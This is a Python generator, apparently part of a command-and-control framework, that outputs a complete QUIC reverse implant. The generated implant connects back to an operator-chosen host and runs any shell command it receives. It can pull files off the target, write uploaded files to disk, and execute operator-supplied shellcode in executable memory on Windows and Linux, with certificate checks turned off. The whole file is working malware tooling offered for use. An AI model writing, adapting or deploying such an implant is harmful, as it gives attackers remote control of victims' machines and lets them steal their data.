#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Generate a self-contained Python QUIC implant script.

Dialect matches lib/protocols/quic/c2_server.py (ALPN kitty-quic by default).
Requires aioquic on the target: pip install aioquic
"""

from __future__ import annotations

from lib.protocols.quic.constants import DEFAULT_QUIC_ALPN


def build_implant_script(
    host: str,
    port: int,
    *,
    alpn: str = DEFAULT_QUIC_ALPN,
    upload_dir: str = ".",
) -> str:
    """Return runnable Python source for the QUIC reverse implant."""
    host_lit = repr(str(host))
    port_lit = int(port)
    alpn_lit = repr(str(alpn))
    upload_dir_lit = repr(str(upload_dir))

    return f'''#!/usr/bin/env python3
import asyncio
import ctypes
import os
import platform
import ssl
import subprocess
import sys

from aioquic.asyncio import QuicConnectionProtocol, connect
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import StreamDataReceived

HOST = {host_lit}
PORT = {port_lit}
ALPN = {alpn_lit}
UPLOAD_DIR = {upload_dir_lit}
IS_WINDOWS = platform.system().lower() == "windows"


class ImplantProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.stream_id = None
        self.buf = b""
        self.cwd = os.getcwd()
        self.upload = None
        self._done = asyncio.Event()

    def connection_made(self, transport):
        super().connection_made(transport)
        self.stream_id = self._quic.get_next_available_stream_id(is_unidirectional=False)
        self._quic.send_stream_data(self.stream_id, b"READY\\n", end_stream=False)
        self.transmit()

    def quic_event_received(self, event):
        if not isinstance(event, StreamDataReceived):
            return
        if event.stream_id != self.stream_id:
            return
        if self.upload is not None:
            self._recv_upload(event.data)
            return
        self.buf += event.data
        while b"\\n" in self.buf:
            line, self.buf = self.buf.split(b"\\n", 1)
            text = line.decode("utf-8", errors="ignore").strip()
            if text:
                self._handle_command(text)

    def _send(self, text: str):
        payload = text if text.endswith("\\n") else text + "\\n"
        self._quic.send_stream_data(self.stream_id, payload.encode("utf-8", errors="ignore"), end_stream=False)
        self.transmit()

    def _send_raw(self, data: bytes):
        if not data:
            return
        self._quic.send_stream_data(self.stream_id, data, end_stream=False)
        self.transmit()

    def _handle_command(self, cmd: str):
        if cmd.startswith(":upload:|"):
            parts = cmd.split("|", 2)
            if len(parts) < 3:
                self._send("ERROR:bad upload header")
                return
            try:
                size = int(parts[2])
            except ValueError:
                self._send("ERROR:invalid upload size")
                return
            name = os.path.basename(parts[1]) or "upload.bin"
            dest = os.path.join(UPLOAD_DIR, name)
            if not os.path.isabs(dest):
                dest = os.path.join(self.cwd, dest)
            os.makedirs(os.path.dirname(dest) or ".", exist_ok=True)
            self.upload = {{"path": dest, "remaining": size, "handle": open(dest, "wb")}}
            self._send("***Ready for upload***")
            return

        if cmd.startswith("~download~|"):
            path = cmd.split("|", 1)[1].strip()
            if not os.path.isabs(path):
                path = os.path.join(self.cwd, path)
            if not os.path.isfile(path):
                self._send(f"ERROR:file not found: {{path}}")
                return
            size = os.path.getsize(path)
            self._send_raw(f"{{size}}\\n".encode())
            with open(path, "rb") as handle:
                for chunk in iter(lambda: handle.read(4096), b""):
                    self._send_raw(chunk)
            return

        if cmd.startswith("exec_shellcode "):
            hexcode = cmd.split(" ", 1)[1].strip()
            try:
                sc = bytes.fromhex(hexcode)
                self._run_shellcode(sc)
                self._send("Shellcode executed.")
            except Exception as exc:
                self._send(f"ERROR:shellcode failed: {{exc}}")
            return

        if cmd.startswith("cd "):
            target = cmd[3:].strip().strip('"').strip("'")
            if not target:
                self._send(self.cwd)
                return
            if not os.path.isabs(target):
                target = os.path.join(self.cwd, target)
            try:
                os.chdir(target)
                self.cwd = os.getcwd()
                self._send(self.cwd)
            except OSError as exc:
                self._send(f"ERROR:{{exc}}")
            return

        if cmd == "pwd":
            self._send(self.cwd)
            return

        try:
            proc = subprocess.run(
                cmd,
                shell=True,
                cwd=self.cwd,
                capture_output=True,
                text=True,
                timeout=120,
            )
            out = (proc.stdout or "") + (proc.stderr or "")
            if not out.strip():
                out = f"[exit {{proc.returncode}}]"
            self._send(out.rstrip())
        except Exception as exc:
            self._send(f"ERROR:{{exc}}")

    def _recv_upload(self, data: bytes):
        state = self.upload
        if not state:
            return
        take = min(len(data), state["remaining"])
        if take:
            state["handle"].write(data[:take])
            state["remaining"] -= take
            data = data[take:]
        if state["remaining"] <= 0:
            state["handle"].close()
            self.upload = None
            self._send("File successfully uploaded!")
        if data and self.upload is not None:
            self._recv_upload(data)

    def _run_shellcode(self, shellcode: bytes):
        if IS_WINDOWS:
            kernel32 = ctypes.windll.kernel32
            mem = kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
            if not mem:
                raise OSError("VirtualAlloc failed")
            ctypes.memmove(mem, shellcode, len(shellcode))
            handle = kernel32.CreateThread(0, 0, mem, 0, 0, 0)
            if not handle:
                raise OSError("CreateThread failed")
            kernel32.WaitForSingleObject(handle, 0xFFFFFFFF)
            return

        libc = ctypes.CDLL(None)
        mmap = libc.mmap
        mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_long]
        mmap.restype = ctypes.c_void_p
        memcpy = libc.memcpy
        memcpy.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
        PROT_READ = 1
        PROT_WRITE = 2
        PROT_EXEC = 4
        MAP_PRIVATE = 0x02
        MAP_ANONYMOUS = 0x20
        mem = mmap(0, len(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)
        if mem in (0, -1):
            raise OSError("mmap failed")
        buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
        memcpy(mem, buf, len(shellcode))
        func = ctypes.CFUNCTYPE(None)(mem)
        func()


async def main():
    configuration = QuicConfiguration(is_client=True, alpn_protocols=[ALPN])
    configuration.verify_mode = ssl.CERT_NONE
    configuration.max_idle_timeout = 600000

    async with connect(
        HOST,
        PORT,
        configuration=configuration,
        create_protocol=ImplantProtocol,
    ) as protocol:
        await asyncio.Event().wait()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit(0)
'''
